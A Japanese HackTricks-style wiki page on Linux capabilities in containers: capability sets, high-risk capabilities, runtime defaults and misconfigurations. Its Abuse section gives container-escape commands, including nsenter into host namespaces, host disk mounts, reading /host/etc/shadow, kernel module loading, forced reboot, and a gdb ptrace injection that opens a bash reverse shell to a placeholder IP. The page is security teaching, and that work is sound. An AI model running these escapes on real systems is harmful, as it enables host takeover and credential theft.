# コンテナ内の Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

Linux capabilities はコンテナセキュリティの最も重要な要素の一つです。なぜなら、微妙ながらも根本的な疑問、**コンテナ内の「root」とは実際に何を意味するのか？**に答えるものだからです。通常の Linux システムでは、歴史的に UID 0 は非常に広範な権限を意味していました。現代のカーネルでは、その権限は capabilities と呼ばれる小さな単位に分割されています。関連する capabilities が削除されていれば、プロセスは root として実行されていても、多くの強力な操作を実行できません。 <sup>[[1]](#references)</sup>

コンテナでは、この違いが非常に重要です。互換性や簡便さのため、多くのワークロードは今でもコンテナ内で UID 0 として起動されます。capabilities を削除しなければ、それはあまりにも危険です。capabilities を削除すれば、コンテナ内の root プロセスは一般的なコンテナ内の作業を行いながら、より機密性の高いカーネル操作を拒否されます。そのため、コンテナ内のシェルに `uid=0(root)` と表示されても、自動的に「host root」や「広範なカーネル権限」を意味するわけではありません。その root ID が実際にどれだけの権限を持つかは、capability セットによって決まります。

Linux capabilities の完全なリファレンスと多くの悪用例については、以下を参照してください。

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 動作

capabilities は、permitted、effective、inheritable、ambient、bounding など、複数のセットで管理されます。多くのコンテナ評価では、各セットの正確なカーネル上の意味よりも、最終的な実用上の問いのほうが重要です。**このプロセスが現時点で実行できる特権操作は何か、そして今後、権限を獲得する可能性は残っているか？** <sup>[[1]](#references)</sup>

これが重要なのは、多くのコンテナ脱出手法が、実際にはコンテナの問題に見せかけた capability の問題だからです。`CAP_SYS_ADMIN` を持つワークロードは、通常のコンテナ内の root プロセスが触れるべきではない膨大なカーネル機能にアクセスできます。`CAP_NET_ADMIN` を持つワークロードは、ホストのネットワーク namespace も共有している場合、はるかに危険になります。`CAP_SYS_PTRACE` を持つワークロードは、ホスト PID の共有によってホストプロセスを参照できる場合、さらに注目すべき対象になります。Docker や Podman では、これは `--pid=host` として設定されることがあります。Kubernetes では通常、`hostPID: true` として設定されます。

つまり、capability セットだけを切り離して評価することはできません。namespace、seccomp、MAC ポリシーと合わせて確認する必要があります。

## Lab

コンテナ内で capabilities を確認する非常に直接的な方法は、次のとおりです。

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

すべての capabilities が追加されたコンテナと、より制限されたコンテナを比較することもできます。

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

限定的な追加の効果を確認するには、すべてを削除し、1つの capability だけを再度追加してみてください:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

これらの小さな実験から、runtimeが単に「privileged」というbooleanを切り替えているわけではないことが分かります。プロセスが実際に利用できる権限の範囲を形作っているのです。

## High-Risk Capabilities

Capabilitiesがescapeの手段となるのは、その操作が**hostが管理するリソース**に及ぶ場合だけです。繰り返し見られる高リスクな組み合わせは次のとおりです。

- **`CAP_SYS_ADMIN`** と、hostのPID、ブロックデバイス、または書き込み可能なkernel制御パス。対象のmount namespaceに参加するには、さらに`CAP_SYS_CHROOT`が必要です。ブロックベースのfilesystemをmountするには、initial user namespaceで`CAP_SYS_ADMIN`が必要です。
- **`CAP_SYS_PTRACE`** と、host PIDの可視性、およびattach可能なhost process。ptrace injectionに`CAP_SYS_ADMIN`は必要ありません。
- **`CAP_DAC_OVERRIDE`または`CAP_DAC_READ_SEARCH`** と、アクセス可能なhost filesystem。これらのcapabilityは異なるDACチェックを回避しますが、host filesystemのビューを作り出すものではありません。
- initial user namespaceでの**`CAP_SYS_MODULE`** と、受け入れ可能でkernel互換性のあるmodule。通常のLinux containerはnodeのkernelを共有しますが、VMまたはuserspace-kernelのruntimeではその境界が変わります。
- initial user namespaceでの**`CAP_MKNOD`** と、device cgroupがすでに許可している実際のhost device。device nodeを作成しても、device cgroupは回避できません。
- **`CAP_SYS_RAWIO`** と、公開されていて利用可能なmemory、I/O port、PCI、またはdevice制御interface。
- hostのrebootには、initial PID namespaceでの**`CAP_SYS_BOOT`**、またはkernel置き換えには、利用可能で許可されたkexecパスが必要です。
- nodeのnetwork状態を直接制御するには、host network namespaceでの**`CAP_NET_ADMIN`**が必要です。**`CAP_NET_RAW`**は特定protocolを利用したescapeに関与する場合がありますが、raw socketだけではnodeへのshellにはなりません。

`CAP_SYS_CHROOT`を単独のescape capabilityとして挙げていないのは意図的です。mount namespaceの`setns()`で必要となる場合があり、すでにアクセス可能なhost treeを使いやすくすることもあります。しかし、`chroot()`だけではそのtreeを公開することも、新たなfilesystem権限を付与することもありません。同様に、`CAP_BPF`と`CAP_PERFMON`は強力なtelemetry機能とkernel攻撃対象領域を公開しますが、別のkernelの脆弱性がない限り、通常の操作は汎用的なcontainer escapeにはなりません。

## Runtime Usage

Docker、Podman、containerdベースのstack、CRI-Oはいずれもcapability制御を使用しますが、デフォルト設定と管理interfaceは異なります。Dockerでは`--cap-drop`や`--cap-add`などのflagで直接指定できます。Podmanにも同様の制御があり、追加の安全レイヤーとしてrootless実行と組み合わせることがよくあります。Kubernetesでは、Podまたはcontainerの`securityContext`を通じてcapabilityの追加と削除を指定します。低レベルのruntimeでは、結果として得られるsetをOCI runtime設定に記述します。LXCやIncusなどのsystem container環境もcapability制御に依存しますが、hostとの統合範囲が広いため、application containerの場合よりも運用者がデフォルト設定を緩めたくなることがあります。 <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

どの環境でも基本原則は同じです。技術的に付与できるcapabilityだからといって、付与すべきとは限りません。実際のインシデントの多くは、より厳格な設定ではworkloadが失敗し、チームが手っ取り早い解決策を必要としたため、運用者が単純にcapabilityを追加したことから始まります。

## Misconfigurations

最も分かりやすいミスは、Docker/Podman形式のCLIで**`--cap-add=ALL`**を指定することですが、これだけではありません。実際によくあるのは、namespace、seccomp、mountへの影響を理解しないまま、特に`CAP_SYS_ADMIN`のような非常に強力なcapabilityを1つまたは2つ、「applicationを動かすため」に付与することです。もう1つよくある失敗は、追加のcapabilityをhost namespaceの共有と組み合わせることです。DockerやPodmanでは`--pid=host`、`--network=host`、`--userns=host`などが該当します。Kubernetesでは、通常、`hostPID: true`や`hostNetwork: true`などのworkload設定によって同等の露出が生じます。こうした組み合わせはいずれも、capabilityが実際に影響を及ぼせる範囲を変えます。

また、workloadが完全な`--privileged`ではないため、実質的な制約があると管理者が考えているケースもよく見られます。それが正しい場合もありますが、実効的な設定がすでにprivilegedに近く、運用上その違いが意味をなさなくなっている場合もあります。

## Abuse

まず、実効的なset、user namespaceのmapping、seccompの状態、namespace、mount、deviceを記録します。capability名だけでは、これらの情報がなければescapeの証拠にはなりません。

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: namespaceとブロックデバイス

ホストのPIDが見える場合、`CAP_SYS_ADMIN`を使ってホストのnamespaceに入ることができます。mount namespaceの操作には、呼び出し元のuser namespaceで`CAP_SYS_CHROOT`も必要です。

**capabilityと制限状況を確認する:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**ターゲットを列挙する:** コンテナ/Pod の設定、またはホストプロセス一覧から明確に確認し、ホスト PID が共有されていることを確かめてから、ターゲットの namespace を調べます。プライベート PID namespace にもローカルの PID 1 は存在するため、それだけではホスト PID が共有されている証拠にはなりません。

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**namespace pathをExploitする：**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

capability checkは、対象を所有するuser namespace内で成功する必要があります。`--pid=host`またはKubernetesの`hostPID: true`で可視性は得られますが、capabilityは得られません。

別のblock-device経路では、候補を**enumerate**してから、アクセス可能なfilesystemを**exploit**します。まず検証済みの候補をread-onlyでmountします：

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

デバイスノードが存在し、device cgroupで許可されている必要があります。また、ブロックファイルシステムのマウントには、initial user namespaceで`CAP_SYS_ADMIN`が必要です。ホストのrootがすでに`/host`にbind mountされていれば、`CAP_SYS_ADMIN`がなくてもホストにアクセスできます。`chroot /host`は利便性のためだけのもので、別途`CAP_SYS_CHROOT`が必要です。

### アクセス可能なホストのroot：直接ファイルシステムを実行

ホストのrootがすでに`/host`にマウントされている場合は、まずマウントを確認してから、既存のアクセスを直接利用します。この方法は`CAP_SYS_ADMIN`に依存しません：

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

`chroot()`が利用できない場合でも、ホストのバイナリがコンテナのアーキテクチャおよびローダーと互換性があれば、マウントされたツリー経由で呼び出せることがよくあります:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

`/host` 配下への直接の読み書きは、すでに host filesystem の侵害にあたります。`chroot()` や host binary の実行は、そのアクセスをより便利にするだけであり、どちらの操作も host mount を作成したり、read-only mount や MAC policy を回避したりするものではありません。

### `CAP_SYS_PTRACE`: host process injection

host PID が見える状態で、対象の user namespace に `CAP_SYS_PTRACE` があれば、GDB を使って許可された host process に `system()` を呼び出させることができます。`CAP_SYS_ADMIN` は必要ありません。

**capability と attach の制御を確認する:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**使い捨て可能なターゲットを列挙して選択する:** 設定または明白なノードプロセス一覧でホストのPID共有を確認する。PID 1や重要なデーモンは絶対に選択しない。

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**選択したプロセスを exploit する：**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

対象は attach 可能で、使用可能な `system()` symbol と Bash payload path が必要です。Yama、non-dumpable state、seccomp、user namespaces、MAC policy によって、この chain がブロックされる場合があります。GDB は attach 中に対象を停止するため、使い捨ての lab process のみを使用してください。

### `CAP_DAC_OVERRIDE` と `CAP_DAC_READ_SEARCH`: 保護された host ファイル

これらの capabilities によって host filesystem が公開されるわけではありません。`/host` がすでに host mount である場合、`CAP_DAC_READ_SEARCH` は読み取り／検索の DAC チェックを回避でき、`CAP_DAC_OVERRIDE` はさらに通常の書き込みチェックも回避できます。

**capabilities を確認する:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**露出しているホストファイルシステムを列挙し、対象の権限を確認する:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

使い捨てラボで**読み取りおよび書き込みのバイパスを実践する**：

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

読み取り専用マウントとLSMのルールは引き続き適用されます。`CAP_DAC_READ_SEARCH`は`open_by_handle_at()`も許可しますが、Shockerのようなbreakoutには、同じ基盤ファイルシステムを対象とするmount file descriptor、有効または発見可能なハンドル、互換性のあるファイルシステム／ストレージ構成が必要であり、さらにruntimeやLSMによってブロックされないことも必要です。この権限だけで、mount namespace外のすべてのファイルシステムに任意にアクセスできるわけではありません。

### `CAP_SYS_MODULE`: 共有カーネルでの実行

通常のLinuxコンテナでは、受け入れられたモジュールは共有ホストカーネルで実行されます。

**capabilityとuser namespaceのスコープを確認します：**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**モジュール読み込みの前提条件を列挙する：**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**互換性のある、事前レビュー済みのproof moduleを使い、使い捨てノード上でのみexploitする:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

capabilityは初期user namespaceで有効でなければなりません。カーネルのバージョンと設定、モジュール署名、lockdown、seccomp、LSMポリシーによってロードが許可されている必要があります。Kata、gVisor、Hyper-V isolationなどのランタイムでは、ワークロードが到達するカーネル境界が変わります。

### `CAP_MKNOD`: 許可されたデバイスハンドルを作成する

`CAP_MKNOD`はデバイスノードを作成しますが、device cgroupを迂回することはできません。デバイスの作成はnamespacedではないため、このcapabilityは初期user namespaceで有効でなければなりません。

**capabilityとuser namespaceのスコープを確認する:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**実際のデバイスと、そのメジャー/マイナー番号、および表示されている cgroup-v1 許可リストを列挙する:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**検証済みの ext-family 候補を読み取り専用で exploit する:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

他のファイルシステムでは対応する読み取り専用ツールが必要です。また、デバイスのマウントには `CAP_SYS_ADMIN` も必要です。作成したノードを開く際の `Operation not permitted` は、通常、デバイス cgroup によるアクセス制限がまだ有効であることを示します。cgroup v2 では、デバイスアクセスは一般に BPF によって強制され、`devices.list` ファイルは存在しません。そのため、open に成功するかどうかが決定的なテストになります。

### `CAP_SYS_RAWIO`: 公開されている raw-I/O インターフェース

汎用的でポータブルな payload はありません。有効なアドレスと作用は、ハードウェアおよびカーネルの設定によって異なります。

**capability と user namespace の適用範囲を確認します:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**公開されている生のインターフェース、ハードウェア、ドライバーを列挙する：**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**特定されたデバイスとアドレス範囲について承認済みの proof がある場合に限り、Exploit を実行してください。** `/dev/mem` がラボで承認されたインターフェースである場合、このテンプレートは内容を出力せずにノードメモリの開示を実証します:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

アドレスはラボのハードウェアマップから取得する必要があります。一部のMMIO領域を読み取ると、副作用が発生する可能性があるためです。汎用的なメモリ書き込みコマンドを示すと、誤解を招き危険です。同じアドレスでも、マシンによっては無害な一方で、別のマシンではハードウェアやカーネルメモリを制御することがあります。Device cgroups、ファイルシステムのアクセス権限、厳格な`/dev/mem`制限、kernel lockdown、仮想化、LSMポリシーによって、有用なアクセスが一般に阻止されます。

### `CAP_SYS_BOOT`: namespaceの再起動またはカーネルの置き換え

private PID namespace内で`reboot()`を実行すると、ホストではなく、そのnamespaceのinitプロセスが終了します。そのため、ホストの再起動に影響させるには、通常はホストのPID共有を介して、初期PID namespaceが必要です。また、kexecを実行するには、互換性のあるカーネルイメージと、制限の緩いlockdown／署名ポリシーも必要です。

**capabilityを確認する:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**PID namespace と kexec の前提条件を列挙する:** PID namespace のリンクだけではノードの初期 namespace かどうか判断できないため、ワークロード設定でホスト PID の共有を確認する。

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**使い捨てのラボノードの再起動が明示的な演習内容である場合に限り、exploitする:**

```bash
sync
reboot -f
```

共有ノードでその capability を証明するためだけに、そのコマンドを実行したり kernel をロードしたりしないでください。private PID namespace 内では、その namespace の init process だけが終了し、host への影響を示すものではありません。

### `CAP_NET_ADMIN` と `CAP_NET_RAW`: host のネットワーク経路

`CAP_NET_ADMIN` の影響範囲は、現在の network namespace 内に限られます。

**capabilities と隔離状態を確認する:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**現在のネットワークを列挙し、ワークロードの設定からホストネットワークを確認します：**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**`CAP_NET_ADMIN`を可逆的に使って演習する：ホストネットワークでは、一時的なインターフェースはノードのインターフェースです。**

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` は RAW および PACKET ソケットを許可しますが、汎用的なホストシェルではありません。文書化された GCE チェーンを**列挙**するには、メタデータルートを確認し、平文の guest-agent トラフィックを観測できるかキャプチャして確認します。

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

前提条件が一致する場合は、[GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) に記載されている環境固有の chain を **exploit** します。リクエストとシーケンスの状態を取得し、SSH key を含む偽造 metadata response を注入してから、host access を検証します。この chain には root、host networking、`CAP_NET_ADMIN`、`CAP_NET_RAW`、平文の GCE metadata traffic、そして競合を発生させられる guest-agent request が必要です。新しい transport や agent の挙動によって、この chain が機能しない場合があります。

### ローカル発信元の制限とインターフェースアドレス

listener は、送信元が `127.0.0.1` の接続を拒否する一方、同じ network namespace に割り当てられた別のアドレスを見落としている場合があります。そのインターフェースから listener に到達できる場合は、loopback 接続と、既存の非 loopback ローカルアドレスにバインドした接続を比較します。`CAP_NET_ADMIN` があれば、現在の namespace でインターフェースを設定できる場合がありますが、適切なアドレスがすでに割り当てられていれば必要ありません。通常の TCP 接続に `CAP_NET_RAW` は必要ありません。これは送信元アドレスの分類に関する欠陥であり、container escape を示すものでも、アプリケーションが特権リクエストを許可する証拠でもありません。<sup>[[1]](#references)[[7]](#references)</sup>

WebSocket listener から有効な HTTP `101 Switching Protocols` response が返れば、opening handshake が完了したことを確認できます。その後にアプリケーションレベルのエラーが発生した場合は、接続が handler に到達したことを示す場合があります。どちらの response も、認証やリクエストされた操作の成功を証明するものではありません。<sup>[[8]](#references)</sup>

## Checks

capability checks の目的は、生の値を出力することだけではなく、プロセスが現在の namespace と mount の状況を危険なものにするだけの権限を持っているかを把握することです。

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

ここで注目すべき点は次のとおりです。

- `capsh --print` は、`cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin`、`cap_sys_module` など、リスクの高い capability を見つける最も簡単な方法です。
- `/proc/self/status` の `CapEff` 行を見ると、他のセットで利用可能なだけの capability ではなく、現在実際に有効な capability がわかります。
- コンテナがホストの PID、ネットワーク、ユーザー名前空間を共有している場合や、書き込み可能なホストマウントがある場合、capability の一覧はさらに重要になります。

生の capability 情報を収集したら、次はその解釈です。プロセスが root か、ユーザー名前空間が有効か、ホストの名前空間を共有しているか、seccomp が強制されているか、AppArmor や SELinux が引き続きプロセスを制限しているかを確認してください。capability セットだけですべてがわかるわけではありませんが、同じような初期状態から始めても、一方のコンテナ脱出が成功し、もう一方が失敗する理由を説明する手掛かりになることがよくあります。

## ランタイムのデフォルト

| ランタイム / プラットフォーム | デフォルトの状態 | デフォルトの動作 | よくある手動での緩和 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトで縮小された capability セット | Docker は capability のデフォルト許可リストを維持し、それ以外を削除します | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--cap-add=ALL`、`--privileged` |
| Podman | デフォルトで縮小された capability セット | Podman コンテナはデフォルトで非特権であり、縮小された capability モデルを使用します | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--privileged` |
| Kubernetes | 変更されていない場合はランタイムのデフォルトを継承 | `securityContext.capabilities` が指定されていない場合、コンテナにはランタイムのデフォルト capability セットが適用されます | `securityContext.capabilities.add`、`drop: [\"ALL\"]` を指定しないこと、`privileged: true` |
| Kubernetes 上の containerd / CRI-O | 通常はランタイムのデフォルト | 実効セットはランタイムと Pod spec の組み合わせによって決まります | Kubernetes の行と同様。OCI/CRI の直接設定で capability を明示的に追加することもできます |

Kubernetes で重要なのは、API が共通のデフォルト capability セットを定義していない点です。Pod で capability を追加も削除もしていない場合、ワークロードはそのノードのランタイムのデフォルトを継承します。

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - Linux マニュアルページ](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux コンテナ設定](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - ランタイムの特権と Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - コンテナの capabilities を設定する](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` と `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - セキュリティ](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - Linux IPv4 プロトコルの実装](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - WebSocket プロトコル](https://www.rfc-editor.org/rfc/rfc6455.html)
